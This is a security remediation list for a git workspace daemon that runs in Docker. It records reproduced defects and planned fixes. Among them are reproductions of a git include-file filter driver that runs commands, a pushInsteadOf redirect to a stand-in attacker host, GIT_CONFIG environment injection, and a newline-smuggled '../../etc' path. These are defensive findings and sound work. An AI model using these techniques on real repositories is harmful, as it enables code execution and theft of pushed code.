# Remediation TODO

**Spec:** `docs/REMEDIATION_SPEC.md` (RR-001..RR-033, RAT-001..RAT-020)
**Source:** code review of `docs/HARDENING_TODO.md` H1–H35, 2026-08-28

Eighteen defects found in the hardening work itself, including two ticked
checkboxes whose security control does not hold. Every defect was reproduced
against the running code before being written down; each task below carries the
reproduction so the implementer can re-run it rather than trust this file.

## How to work this list

Same discipline `docs/HARDENING_TODO.md` established, with two additions the
review's findings make necessary:

1. Implement the task.
2. **Write the adversarial test first, and watch it fail.** Thirteen of the
   eighteen defects had a passing test that was supposed to cover exactly that
   behavior — the tests selected inputs that happened to already work. A test
   written after the fix, against an input the fix obviously handles, is how
   this list came to exist.
3. Run the new test alone, then the relevant suite, then the full suite.
4. **Revert-verify:** back up the changed files, `git show HEAD:<file> > <file>`,
   confirm the new tests fail *for the right reason*, restore.
5. Lint, format, typecheck. Check for Docker leftovers.
6. Schema-drift check if any tool output changed; bump `CONTRACT_VERSION` per §33.2.
7. One task per commit. No `Co-Authored-By` trailers.
8. **Re-run every claim before writing it in the task's write-up.** RR-033 exists
   because H35's tracking table carried a mis-citation and an inaccurate defect
   description that were transcribed rather than verified.

---

## Phase 0 — Critical: security controls that do not hold

Both are ticked checkboxes in `docs/HARDENING_TODO.md`. Do these first.

### R1 — Configuration discovery expands includes ✅
**Satisfies:** RR-001 · **Verified by:** RAT-001, RAT-002
**Commit:** `2e83fcc`

- [x] Add `--includes` to both `git config --list` probes (`--local`, `--worktree`)
- [x] Add `GIT_CONFIG_COUNT`, `GIT_CONFIG_KEY_<n>`, `GIT_CONFIG_VALUE_<n>`,
      `GIT_CONFIG_PARAMETERS` to the environment scrub
- [x] Correct `git/service.py:103-111`'s "complete with respect to what can
      actually run" docstring — it is only complete *given* include expansion
- [x] Test both `include.path` and `includeIf.*.path`

**Defect (reproduced end-to-end).** `git/service.py:126-128` runs
`git config --list -z --local`, which does not expand includes. With
`.git/config` → `[include] path = evil.cfg`, `.git/evil.cfg` →
`[filter "sneaky"] clean = touch <marker>`, `.gitattributes` → `* filter=sneaky`:

```
_discover_code_executing_overrides(repo)  ->  []
read_git_diff(repo)                       ->  marker exists: True
```

Repository-supplied code executed as the daemon uid through the real `git_diff`
path. `--no-ext-diff --no-textconv` do not cover `filter.*`, so HR-002's stated
property does not hold.

**Note.** `run_git_host_side(repo, ['status'])` did *not* trigger it in the
reproduction (no working-tree change staged at that moment); `read_git_diff` did.
Do not conclude `git status` is safe — HR-002's own §4.2 records that
`git status` executes `filter.*.clean`. Test both.

**Implementation.** `--includes` added to both `_discover_code_executing_overrides`
scope-flag invocations (`--local`, `--worktree`) — verified this does not change
the function's existing fallback semantics (non-zero exit on "not a repository",
zero exit + normal listing otherwise; confirmed with real git 2.43.0 against a
non-repo directory and an empty repo before trusting it). `_ENV_VARS_TO_SCRUB`
gained `GIT_CONFIG_COUNT`/`GIT_CONFIG_PARAMETERS`; `GIT_CONFIG_KEY_<n>`/
`GIT_CONFIG_VALUE_<n>` are an unbounded per-index family, scrubbed by prefix
(`_ENV_VAR_PREFIXES_TO_SCRUB`) rather than a fixed tuple. Verified empirically
that this injection channel is real and independent of `--local`/`--worktree`
scope: `GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=filter.x.clean
GIT_CONFIG_VALUE_0=... git config --list --includes` reports the injected key
regardless of the daemon's own `.git/config`.

**Verified the tests catch the regression:** reverted `git/service.py` to
`git show HEAD^` and reran the four new tests — all four failed, three with
"filter.sneaky(2).clean" absent from `_discover_code_executing_overrides`'s
return / the marker file existing after `run_git_host_side`, one (the
env-injection test) with the marker existing after `run_git_host_side` despite
the pre-fix scrub tuple not covering `GIT_CONFIG_KEY_0`. Restored; all 26 tests
in the file pass again. No Docker leftovers.

**Full relevant suite:** `tests/git/` + `tests/workspace/test_host_side_execution_safety.py`
+ `tests/workspace/test_git_diff_log_tools.py` (185 passed, includes real Docker) —
clean. `ruff check`, `ruff format --check`, `mypy src` clean across the whole
tree. No schema drift (no tool output shape changed). Full unscoped `tests/`
background run: 880 passed (876 before this task's 4 new tests), no
interruption, no Docker leftovers.

**New tests:** `tests/git/test_service.py` — `_discover_code_executing_overrides`
(direct, white-box) discovers a driver defined only through `include.path` and
through `includeIf.onbranch:<current-branch>.path`; `run_git_host_side` end to
end neutralizes a `filter.*.clean` driver bound via `.gitattributes` and defined
only through `include.path`, forced by a real `git diff` (the exact reproduction
that found the defect); `run_git_host_side` scrubs a `GIT_CONFIG_COUNT`/
`GIT_CONFIG_KEY_0`/`GIT_CONFIG_VALUE_0`-injected filter driver from a simulated
tainted daemon environment (`monkeypatch.setenv`), proven against a real
baseline subprocess call that confirms the injection mechanism itself works
before asserting the mediated call suppresses it.

### R2 — The push goes to the validated URL ✅ (partial — see below)
**Satisfies:** RR-002, RR-003 · **Verified by:** RAT-003, RAT-004
**Commit:** `652a6d7`

- [x] Substitute the resolved, validated URL into the push invocation instead of
      passing the remote name (`git/push.py:109`) — **superseded, see below**
- [x] Keep the existing host-side resolution — it is necessary, just not sufficient
- [ ] Assert the success audit record's `remote_repository` matches the
      destination actually contacted — **blocked, see below**
- [ ] Add the missing assertions for `refspec` and `remote_protection_status`
      — **blocked, see below**

**Defect (reproduced).** Validation runs host-side with
`GIT_CONFIG_GLOBAL=/dev/null`; the push runs in-container **by remote name**,
where Git re-resolves against `/etc/gitconfig` and `$HOME/.gitconfig`.
`entrypoint.sh:82` chowns `$HOME` to the container user. With
`~/.gitconfig` containing
`[url "https://evil.example.com/evil/other.git"] pushInsteadOf = https://github.com/owner/repo.git`:

```
daemon's host-side validation view : https://github.com/owner/repo.git      <- approved
container's view                   : https://evil.example.com/evil/other.git
git push --dry-run                 -> https://evil.example.com/evil/other.git/
```

HR-014 offered two remedies as alternatives; only the first was taken, and it
does not close the gap. The resulting audit record names the approved
destination, not the one reached.

**The originally-planned fix (URL substitution alone) does not work —
discovered empirically while implementing, not assumed.** `RR-002`'s own
"Note" claimed passing the resolved URL instead of the remote name closes the
TOCTOU because "the resolved value crosses the boundary rather than a name
re-resolved on the far side." Verified directly against git 2.43.0 before
trusting it: `url.<base>.pushInsteadOf` rewrites a *literal URL argument*
exactly as readily as a named remote —

```
git -c "url.<real>.pushInsteadOf=" push "<real-url>" ...   -> still redirected to evil.git
```

— the `-c` override doesn't neutralize it either: `pushInsteadOf` is a
multi-valued, prefix-matching key (every configured occurrence is checked
against the destination, not "the last one wins" the way a scalar key like
`filter.x.clean` is), so adding an empty override via `-c` just adds another
entry alongside the real one rather than replacing it. There is no git flag or
config override that disables `insteadOf` rewriting for one invocation. This
supersedes RR-002's own text, which is corrected by this task's R26 amendment.

**The actual fix: compare, don't just substitute.** `git remote get-url --push
<name>` is pure local configuration resolution — verified empirically to
return instantly even against an unresolvable hostname, no DNS lookup, no
connection. Run *in-container*, as the container user, immediately before the
real push, it tells the daemon exactly what the container's own git would
actually use — including any `pushInsteadOf`/`pushurl` redirect written to
`.git/config` or `$HOME/.gitconfig` through `exec`. Compared against the
host-side-validated identity (by normalized `owner/repo`, not raw string — see
below) and the push is refused, before `git push` itself ever runs, on any
disagreement. `validate_remote_identity_for_push` now returns a
`ValidatedPushRemote(repository, push_url)` instead of a bare `str`, so the
caller has the exact validated identity to compare against.

**A real false positive found and fixed before trusting the check.** The
first version compared raw URL strings and failed
`test_git_push_reaches_the_real_github_auth_stage_cleanly` — a *legitimate*
push, no attack involved. `entrypoint.sh:48` provisions a trusted, root-owned,
system-scope `url."git@github.com:".insteadOf "https://github.com/"` (S24) so
an HTTPS-authored origin pushes over the container's actual SSH key. The
host-side resolution deliberately blanks `GIT_CONFIG_SYSTEM` too (the host's
own `/etc/gitconfig` has nothing to do with this container), so it never sees
this rewrite, while the in-container resolution correctly applies it — a real
difference, not an attack. Comparing by **normalized identity**
(`normalize_to_owner_repo`) instead of raw string fixes this: `https://
github.com/owner/repo.git` and `git@github.com:owner/repo.git` normalize to
the same `owner/repo` and are accepted, while a redirect to an unrecognized
host or a different repository normalizes to a different value (or `None`)
and is rejected. The actual push now uses the in-container-resolved URL
(freshest possible value, confirmed a moment earlier to match), not the
host-side one.

**Blocked, same reason as AT-010/AT-027/AT-028's second halves.** The last two
checklist items need a *successful* structured `git_push` to inspect its
success-path audit record, and the structured tool restricts remotes to
`github.com` forms only (§20.2) — a genuine end-to-end success needs a real,
provisioned GitHub deploy key, which D3 deferred (manual provisioning, none
registered in this sandbox). Not faked with a mock: this codebase's entire
suite is real-Docker/real-git throughout (3 of 66 test files use any mock at
all), and a mocked "success" would prove nothing about the actual metadata
construction. Tracked as genuinely open, not silently dropped.

---

## Phase 1 — High: data loss and client-visible correctness

### R3 — `git_commit` refuses a path that is not a path
**Satisfies:** RR-004 · **Verified by:** RAT-005

- [ ] Reject an empty-string entry, and any entry normalizing to the repository
      root (`""`, `"."`, `"./"`), with `INVALID_ARGUMENT`
- [ ] Test each rejected form stages nothing — with `strict=False`, the default

**Defect (reproduced).** `tools/git.py:385` checks only `if not paths:` — a
non-empty list containing an empty string passes.
`build_add_argv([""])` → `['git', 'add', '--', ':(literal)']`, and real git 2.43
stages the entire working tree for that pathspec. `strict` mode catches it
incidentally (`normpath("") == "."`) but defaults to `False`.

### R4 — A failed commit restores the index
**Satisfies:** RR-005 · **Verified by:** RAT-006

- [ ] Restore each path's **prior index state**, not `HEAD`
- [ ] Where the prior state cannot be restored faithfully, do not perform a
      destructive rollback — report the index as left dirty instead
- [ ] Test with a path holding prior staged content distinct from HEAD

**Defect (reproduced — data loss).** `git/commit.py:69-79` runs
`git reset -- <paths>`, which resets to HEAD:

```
index BEFORE rollback: l1|STAGED|
index AFTER  rollback: l1|          <- caller's staged work destroyed
```

The write-up's empirical check confirmed other *paths* survive; it did not check
the same path's prior *content*. The test used a previously-untracked file, where
reset-to-HEAD is coincidentally correct.

**Implementation note.** Capturing the pre-`add` index for the named paths
(`git stash create`, or reading the index entries) is the faithful approach.
Failing that, the honest fallback is to skip the reset and report the index
dirty — a leaked stage is recoverable; destroyed staged work is not.

### R5 — Every filesystem error is a typed `WorkspaceError`
**Satisfies:** RR-006 · **Verified by:** RAT-007

- [ ] Classify `FileNotFoundError`/`IsADirectoryError`/`PermissionError` from the
      raw `os.open` calls at `security.py:97` and `security.py:111`
- [ ] Remove or reach the now-dead `S_ISDIR` check at `service.py:304-307`
- [ ] Stop mapping every `OSError` from the `ensure_parent_directories` walk to
      `PathOutsideRepositoryError` (`security.py:155-159`) — `ENOTDIR` is not an escape
- [ ] Move `resolve_open_fd` at `service.py:294` inside the `try` (the one fd in
      the file not covered by a handler)

**Defect (reproduced).** H9's fd rewrite regressed three previously-typed paths:

```
read_file(missing)           -> FileNotFoundError   UNTRANSLATED -> SDK crash
write_file(onto a directory) -> IsADirectoryError   UNTRANSLATED -> SDK crash
delete_file(missing parent)  -> FileNotFoundError   UNTRANSLATED -> SDK crash
```

All three returned `InvalidArgumentError` before H9 (`git show 4bfff54`).
`translate_workspace_errors` catches only `WorkspaceError`, so these reach the
client with no `code`, no `recoverable`, no `details`.

**Also here (same file, same rewrite):**
- [ ] `service.py:317-318`'s `os.pread(fd, existing_size, 0)` transfers at most
      `0x7ffff000` bytes, so a file over 2 GiB hashes short → spurious
      `FILE_CONFLICT`. Loop, or stream.
- [ ] `service.py:347-348`'s `actual.unlink()` deletes by path string at a
      location outside the root after the fd is closed. Use
      `os.unlink(name, dir_fd=…)`.
- [ ] Pre-existing but rewritten by H9: `delete_file("link")` on an in-repo
      symlink deletes the **target** and leaves the dangling link.

### R6 — Enumeration survives any unreadable entry
**Satisfies:** RR-007 · **Verified by:** RAT-008

- [ ] Catch `RuntimeError` (ELOOP) alongside the existing `WorkspaceError`
      handlers at `service.py:116-117` and `search.py:100-109`
- [ ] Skip or per-entry-report the bad entry; never abort the listing
- [ ] Test a symlink loop and a permission error, in both `list_files` and
      `search_files`

**Defect (reproduced).** Two mutually-referencing symlinks — trivially creatable
via `exec` — abort `list_files` entirely:

```
RuntimeError: Symlink loop from '/tmp/…/a'   UNTRANSLATED -> whole listing aborts
```

`Path.resolve()` raises `RuntimeError` on ELOOP in CPython 3.12, which is neither
`OSError` nor a `WorkspaceError`. `search_files` survives only incidentally
(`candidate.is_file()` is `False` for a loop) — that is luck, not coverage.

### R7 — A diagnostic cannot fail the operation it annotates
**Satisfies:** RR-008 · **Verified by:** RAT-009

- [ ] Guard the response type in `_query_branch_rules` / `verify_remote_protection`
- [ ] Degrade to `unverified` with a reason for any unexpected shape
- [ ] Test a `200` returning a JSON object rather than an array

**Defect (reproduced — introduced by H32).** The rewrite iterates the parsed body
without a type guard:

```
*** RAISED AttributeError: 'str' object has no attribute 'get'
```

The exception escapes `verify_remote_protection`, escapes `workspace_open`, and
passes `translate_workspace_errors` uncaught — violating the function's own
"never raises" docstring, §18.5's "a diagnostic SHALL NOT fail `workspace_open`
by itself", and HR-022. Reachable through a misconfigured `api_base_url`.

**Also here:** `_query_branch_rules` does not paginate. A branch with more than
one page of rules under-reports, which with `require_remote_protection: deny`
blocks legitimate work. Either paginate or set `per_page` and document the bound.

---

## Phase 2 — High: authorization and lifecycle

### R8 — Job-scoped tools re-check authorization
**Satisfies:** RR-010, RR-011 · **Verified by:** RAT-011

- [ ] Re-check in `exec_status_tool`, `exec_output_tool`, `exec_cancel_tool` —
      resolve `job_id` → `workspace_id` → `get_authorized`
- [ ] Either reload `RepositoryRegistry` on config change, or restate HR-016's
      "immediately revokes access" / "live configuration" as restart-scoped

**Defect (reproduced).** `tools/execution.py:510`, `:518`, `:626` take only
`job_id` and never touch the registry, while `exec` (`:328`) and `exec_start`
(`:434`) both call `get_authorized`. After deauthorization, a client holding a
stale `job_id` still reads that job's captured stdout/stderr and can cancel it.
`job_store.get(job_id)` already returns `workspace_id`, so the check is one line.

`RepositoryRegistry` is constructed once at `server.py:55` and never reloaded, so
"live" means "as of last restart". The test file says so honestly; the checkbox
and HR-016 do not.

### R9 — `delete` cannot wedge a workspace
**Satisfies:** RR-012 · **Verified by:** RAT-012

- [ ] Move cache-volume removal and ssh-agent termination so they cannot sit
      between container removal and row deletion
- [ ] Make both best-effort (log and continue) — neither is a reason to strand
      the row
- [ ] Test a `delete` whose volume removal fails

**Defect (reproduced structurally).** `workspace/manager.py:653-661` orders:
mark `DELETING` → remove container → **remove cache volumes** (raises) →
**terminate ssh-agent** (raises) → delete rows. `_remove_cache_volumes` raises
`ContainerRuntimeFailedError` on any `DockerException`, including
`409 volume is in use` — reachable because cache volumes are *repository*-scoped
and shared with every other workspace of that repository. Either failure leaves
container gone and row in `DELETING`, **permanently**: a retry finds no container
and hits the same failure.

H23 introduced the volume-removal failure point into the method H16 had just made
atomic — the second clause of HR-018 was never implemented.

### R10 — A failed termination is never reported as success
**Satisfies:** RR-013, RR-015 · **Verified by:** RAT-013

- [ ] Propagate the `DockerException` at `execution/service.py:205-208` instead
      of returning silently
- [ ] Bound the drain by closing the stream, not by abandoning the `wait_for` —
      including on the `timeout_seconds is None` path
- [ ] Test with `exec_inspect` raising, not with `os.killpg` monkeypatched

**Defect (reproduced structurally).** `execution/service.py:205-208`:

```python
try:
    info = self._docker.api.exec_inspect(exec_id)
except docker.errors.DockerException:
    return                                   # <- silent success
```

The docstring three lines above states "HR-020 requires a failed signal be
reported as a structured error, not silently swallowed". `_terminate` sees no
exception, `termination_failed` stays `False`, and `_run` marks the job
`CANCELED`/`TIMED_OUT`. This is also the last untranslated `DockerException` in
the exec path H19 subtask 1 claims to have closed.

Separately: `asyncio.wait_for` cancels the awaiting future, not the `to_thread`
worker. A stream that never EOFs holds an executor thread forever; the only thing
that frees it (`live.stream.close()`) runs *only on termination failure*. The
reviewing agent's own verification script hung on this until killed.

### R11 — `rebuild`/`reset` never adopt the container they replace
**Satisfies:** RR-014

- [ ] Disable adoption on the `_recreate` path
- [ ] Start an adopted container before returning it as ready, or return a state
      the caller must act on
- [ ] Test `reset` against a row whose `container_id` is `None` while a labeled
      container still holds the deterministic name

**Defect.** `_recreate` resolves the container to remove by `container_id`, so
when the row's `container_id` is `None` but a labeled container occupies the
name — H15's own scenario #2 — `_run_container` → `_adopt_or_remove_by_name`
adopts it. `reset` promises to discard environment state; `rebuild(image=…)`
promises the new image. Both silently return the stale container.

Adoption also propagates a non-running state straight out of `ensure_workspace`
with no `start()`, so the first `workspace_open` after adopting a stopped orphan
returns `STOPPED` and the next tool call raises `WORKSPACE_NOT_RUNNING`. It
self-heals on the second call; the first is wrong. The adopt test uses a
*running* container.

---

## Phase 3 — High: output and pagination

### R12 — Pagination is character-safe under any content
**Satisfies:** RR-016, RR-017 · **Verified by:** RAT-014, RAT-015

- [ ] Trim by scanning back for a UTF-8 lead byte, or re-attempt the decode past
      each invalid byte — not by inspecting only the first `UnicodeDecodeError`
- [ ] Reject `max_bytes < 1`
- [ ] Clamp `next_offset` to `total_bytes` rather than echoing an out-of-range offset
- [ ] Test with invalid bytes present, for every `max_bytes` from 1 to 64

**Defect (both reproduced).** `_trim_incomplete_trailing_char` inspects only the
first decode error, so an earlier invalid byte masks the truncated tail:

```
window  = b'\xff\xe6\x97'      # 0xff, then 2 of the 3 bytes of 日
trimmed = b'\xff\xe6\x97'      # unchanged -> the character is split
```

Invalid bytes are a *designed-for* input: H19 added
`encode("utf-8", errors="surrogateescape")` at `git/diff.py:145` specifically so
they survive. The test uses valid UTF-8 only.

And `max_bytes=0` is accepted, producing permanent zero progress:

```
call1  next_offset=0  truncated=True
call2  next_offset=0  truncated=True     <- forever
```

— precisely the case H24's write-up claims was eliminated.

### R13 — `read_file` classifies and bounds correctly
**Satisfies:** RR-018, RR-020 · **Verified by:** RAT-016

- [ ] Decode on a character boundary — a mid-character cut is truncated text, not binary
- [ ] Set `truncated=True` whenever the read was bounded
- [ ] `seek`/`read` the requested span for `byte_range` instead of an unbounded `f.read()`
- [ ] Test with a multi-byte character at the limit boundary

**Defect (reproduced — regression).** `filesystem/service.py:202,221` reads
`limit + 1` bytes then `data.decode("utf-8")`:

```
max_read_bytes=10, file = b"a"*10 + "é".encode() + b"tail"
->  is_binary=True   content=None   truncated=False
```

An ordinary UTF-8 text file is reported as binary, content dropped, and
`truncated=False` denies the client even the signal to retry. Pre-H29 read the
whole file and truncated with `errors="ignore"`. The write-up discloses only the
opposite narrowing.

`byte_range` remains an unbounded read: `read_file(path, byte_range=(0,1))` on a
10 GB in-repo file loads 10 GB. The H29 rationale ("needs the full content
decoded to slice at an arbitrary position") is wrong for `byte_range` — the slice
is applied to raw bytes, so `seek`/`read` is exactly equivalent. Only
`line_range` genuinely needs scanning.

### R14 — `read_log_tail` returns whole lines
**Satisfies:** RR-019 · **Verified by:** RAT-017

- [ ] Change `>=` to `>` at `execution/log_capture.py:159`
- [ ] Test `read_log_tail` composed with `tail_text` — the composition
      `exec_status` actually uses — at a **nonzero** backward offset

**Defect (reproduced).** `count()` includes the newline terminating the leading
partial line, so at `count == max_lines` only `max_lines - 1` complete lines
follow and `tail_text`'s `lines[-max_lines:]` returns the fragment first. At
production defaults, 2 of 60 line widths return a truncated fragment presented as
a complete log line — on **every poll** of a running job.

Existing coverage cannot catch it: one test writes a 10 KB file so `read_from == 0`
and the backward arithmetic never runs; the other is the vacuous assertion R22
removes.

---

## Phase 4 — State reporting (regressions introduced by H32–H35)

### R15 — `oom_killed` reflects the current container
**Satisfies:** RR-021 · **Verified by:** RAT-018

- [ ] Recompute or clear `oom_killed` on every transition that changes which
      container the record describes — `start`, `stop`, `restart`, `_recreate`
- [ ] Test the OOM → successful-reopen path, not only OOM → reconcile

**Defect (reproduced against real Docker).** Only `reconcile` and the
Docker-failure paths set it; the lifecycle transitions preserve whatever was
there:

```
AFTER OOM:               state=failed   oom_killed=True
AFTER SUCCESSFUL REOPEN: state=running  oom_killed=True    <- stale
```

A healthy running workspace reports `oom_killed: true` indefinitely, contradicting
the field's own docstring and `docs/SPEC.md` §26. Both H32 tests covered only the
single OOM→reconcile transition.

### R16 — A running job has a pid, or its absence is surfaced
**Satisfies:** RR-022

- [ ] Retry `pid_of` until the exec reports one, or record the absence explicitly
- [ ] Make `reconcile_jobs` distinguish "pid unknown" from "pid not alive"
- [ ] Correct `mark_running`'s docstring, which promises a later update that does
      not exist
- [ ] Decide `update_output_counts`: wire it up or delete it with its test

**Defect.** `ExecutionService.pid_of` returns `int | None` — `None` on
`DockerException` and on a missing/zero `Pid`. `mark_running(pid=None)` is
therefore reachable, and its docstring promises the value is filled in "by a
later update". `mark_running` is the **only** writer of `pid` in the codebase;
`update_output_counts` does not touch `pid` and has zero production call sites.
So a job that starts without a pid never gets one, and `reconcile_jobs` reports
`pid_alive=False` — withholding the orphaned-process warning that exists for
exactly this case.

The review's two separate findings ("the no-race claim is false" and
"`update_output_counts` is dead code") are the same defect: the dead method is
the missing half of the mitigation.

### R17 — Transport classification separates auth from local failure
**Satisfies:** RR-023 · **Verified by:** RAT-019

- [ ] Anchor `is_auth_failure` on wording that genuinely indicates a rejected
      credential — OpenSSH's parenthetical (`Permission denied (publickey)`), or
      SSH context — not the bare substring
- [ ] Test a local `Permission denied` is *not* classified as auth failure

**Defect (reproduced — introduced by H32).**

```
error: cannot open '.git/FETCH_HEAD': Permission denied        -> GIT_AUTH_FAILED
fatal: could not create leading directories: Permission denied -> GIT_AUTH_FAILED
warning: unable to unlink .git/x: Permission denied            -> GIT_AUTH_FAILED
```

`GitAuthFailedError` carries `default_recoverable = False`, so a fixable local
permission problem is reported as a permanent credential failure. Reachable
through the supported `git_dir_mode: read-only` (§18.2), under which the
container cannot write `.git` and every `git_pull` fetch produces this class of
error.

The precedent was already in the codebase and was cited as the model:
`git/pull.py`'s `is_non_fast_forward_failure` docstring explicitly warns against
misclassifying a command's *other* failure modes.

---

## Phase 5 — Redaction, entrypoint, environment

### R18 — Redaction recurses and preserves types
**Satisfies:** RR-009 · **Verified by:** RAT-010

- [ ] Carry the key hint into the dict branch (`errors.py:284`), as the list
      branch at `:290` already does
- [ ] Do not redact a non-string scalar solely on a substring key hint, or
      preserve its type when redacting

**Defect (reproduced).** H11 fixed the list branch and left the dict branch one
line above it unfixed:

```
{'secret': {'a': 'hunter2'}}  ->  {'secret': {'a': 'hunter2'}}   <- LEAKS
{'ssh_key_present': True}     ->  {'ssh_key_present': '[REDACTED]'}
{'key_count': 3}              ->  {'key_count': '[REDACTED]'}
```

The first is a real leak of the exact shape H11 was written to stop. The other
two silently convert booleans and integers to strings in `details` and audit
`metadata` — latent today, but the first `*_key_*` count or flag anyone adds will
be mangled.

### R19 — The entrypoint rejects malformed cache entries and does not follow symlinks
**Satisfies:** RR-029, RR-030

- [ ] Reject any entry containing a newline (`IFS=':' read -ra` consumes only the
      first line and silently drops the rest)
- [ ] Treat leading, middle, and trailing empty fields identically
- [ ] Do not `mkdir -p`/`chown` through a symlink as root — resolve under `$HOME`
      or operate per-component with `-h`
- [ ] Correct `entrypoint.sh:90-98`'s comment, which contradicts H6's validator

**Defect (verified in bash).** `MCP_CACHE_PATHS=$'.cargo\n../../etc'` silently
drops `../../etc` — no rejection, no mount — while the write-up claims the script
"exits non-zero rather than silently skipping the bad entry". A trailing colon is
likewise dropped, while leading/middle empties are correctly rejected.

`entrypoint.sh:119-120` follows symlinks as root before the identity drop. Cache
volumes persist across runs and are container-writable, so a symlink planted in
one cache's volume redirects a later, `..`-free cache path outside `$HOME`.

### R20 — Every daemon-controlled variable is merged last
**Satisfies:** RR-031

- [ ] Compute `MCP_CACHE_PATHS` inside `build_workspace_run_kwargs` and merge it
      with the other `MCP_*` variables, not through `extra_env`

**Defect.** `MCP_CACHE_PATHS` is daemon-computed but injected through
`extra_env` (`tools/workspace.py:416-418`, `cli.py:265-267`), which
`build_workspace_run_kwargs` merges **first** (`container_config.py:103,108`).
The dict-overwrite is additionally guarded by `if resolved_caches:`. H6's stated
property — "ordering alone cannot produce an override even if the filter is
bypassed" — does not hold for it. Not exploitable today only because H6's filter
and H8's re-validation both stand; that is defense-in-depth working, not the
property being met.

---

## Phase 6 — Test and build integrity

### R21 — Teardown removes only what the suite created
**Satisfies:** RR-024 · **Verified by:** RAT-020

- [ ] Track volume *creation*, not reference (`conftest.py:78-80`)
- [ ] Until then, give each run a unique repository id so the deterministic
      volume name cannot collide with production
- [ ] Test that a volume matching the production name for a repository the suite
      also uses survives a full run

**Defect.** `conftest.py:78-80` records every volume-type mount `Source` from
`run()` kwargs — every volume *referenced*, not created — and teardown
`remove(force=True)`s them. Every test hard-codes repository id `"example"` and
`cache_volume_name` is deterministic, so a real deployment on the same host
serving repository `example` with a `cargo` cache **loses that volume and its
contents to a suite run**. H1's write-up claims "every removal targets an
identity this process itself watched get created."

This is H1's own still-open concurrency item, but the destructive half is
reachable without concurrency.

### R22 — Replace assertions that restate their subject's postcondition
**Satisfies:** RR-025

- [ ] `tests/execution/test_log_capture.py:205-218` — assert the returned bytes
      are the correct last N lines, not `count(b"\n") >= N`
- [ ] `tests/git/test_service.py:227-238` — assert the read *succeeded* and
      returned correct content, not merely that a marker is absent

**Defect (reproduced).** The log-capture test's sole assertion is literally the
loop's exit condition at `log_capture.py:159`; it cannot fail while the loop
terminates. The `diff.external` test passes even though
`git -c diff.external= diff` exits 128 with `fatal: external diff died` — a read
that fails is indistinguishable from a read that was safely neutralized, which
H3's own subtask forbids.

This is HR-027's anti-pattern recurring two tasks after the task that fixed it,
which is why RR-025 is a standing requirement rather than a one-time correction.

### R23 — Coverage is selected adversarially
**Satisfies:** RR-026

Strengthen each test to exercise the input class that motivated its requirement.
Most are folded into R3–R17; this task is the sweep that confirms none was missed:

- [ ] Character-safe pagination — invalid bytes present (R12)
- [ ] Index rollback — a path with prior staged content (R4)
- [ ] Pathspec literalization — `""`, `"."`, `"./"` (R3)
- [ ] Failed termination — unreachable Docker daemon (R10)
- [ ] Enumeration resilience — symlink loop, permission error (R6)
- [ ] Tail correctness — nonzero backward offset (R14)
- [ ] Text/binary — multi-byte character at the limit boundary (R13)

### R24 — Reverting a fix fails a test
**Satisfies:** RR-027

Each is implemented but unconstrained — deleting the fix leaves the suite green:

- [ ] `--end-of-options` placement (`git/diff.py:125`, `git/log.py:96`) — every
      existing test uses a leading-`-` value, which trips
      `validate_revision_argument` first, so the second layer is never reached
- [ ] `patch_file`'s `expected_sha256` pass-through (`tools/filesystem.py:255-257`)
- [ ] Tracked cache-volume removal (`conftest.py:123-125`)
- [ ] `git_push` success-record `refspec` / `remote_protection_status` (R2)

### R25 — The contract check is order-insensitive and monotonic
**Satisfies:** RR-028

- [ ] Sort the tool array by name before diffing (`jq -S` sorts object keys only,
      so a pure reordering falsely demands a bump)
- [ ] Reject a non-increasing `contract_version`
- [ ] Widen `docs/TOOLS.md`'s drift-check pattern beyond `[a-z_]+` so a future
      tool name with a digit does not produce a spurious failure

---

## Phase 7 — Documentation truth

### R26 — Apply the `REMEDIATION_SPEC.md` §16 amendments
**Satisfies:** RR-032, RR-033

- [ ] `SPEC.md` §24 — state that only container lifecycle, job reconciliation,
      ssh-agent lifecycle, and policy denials are logged; list the rest as
      unimplemented
- [ ] `SPEC.md` §20.2, §18.7, §26 — per the §16 table
- [ ] `HARDENING_SPEC.md` HR-002, HR-014, HR-016, HR-018, HR-026 — per the §16 table
- [ ] `HARDENING_TODO.md` H35 table — remove the S31/H32 mis-citation; restate
      the S9/S10 "fails open" row as an error-classification gap
- [ ] `TODO.md` S15 correction — it asserts the `pid=None` race does not exist; it does
- [ ] Bump `SPEC.md` to 0.3 and note in `HARDENING_SPEC.md` §2 which points this
      document governed and have now returned

**Defect (verified).** H34's §24 amendment states a file write, a file delete,
and a job cancellation "are logged operationally (§13, HR-031)". Neither
`tools/filesystem.py`, `filesystem/service.py`, nor `tools/execution.py` contains
a logger at all — only container lifecycle is logged. Three of four claims are
false, in the direction of overclaiming, introduced by the task whose purpose was
eliminating documentation overclaims.

H35's table carried an S31 row citing H32 for pid-exhaustion detection (H32 never
addressed it) and an S9/S10 row calling rule 3 "fails open" when the request is in
fact still refused, just with a less specific code. Both were transcribed rather
than re-run.

---

## Deferred

### H37 — §12.1 rule 3 classification gap
Already tracked in `docs/HARDENING_TODO.md`'s Deferred section. Confirmed not an
access-control bypass — only a less specific error code. Fix scoped there.

### R27 — Extract tool bodies from the `register()` closures
Not scheduled. `tools/git.py`'s `register()` is 853 lines and `git_push_tool`
alone is 306; tool bodies cannot be unit-tested without constructing a server,
which is what forced H32's `run_setup_steps` extraction. Worth doing, but it is a
large mechanical refactor touching every tool module and would collide with every
task above. Revisit once Phases 0–7 are closed.

---

## Definition of done

Both Critical requirements are closed and covered by RAT-001..RAT-004; every
`SHALL` in `docs/REMEDIATION_SPEC.md` is implemented or explicitly deferred with a
reason; every test in RR-026's table exercises its adversarial input; every fix in
RR-027 fails the suite when reverted; §16's amendments are applied; the full suite
passes with no Docker-dependent test skipped; a suite run leaves foreign Docker
state untouched; and no statement in any document overstates what the code does.
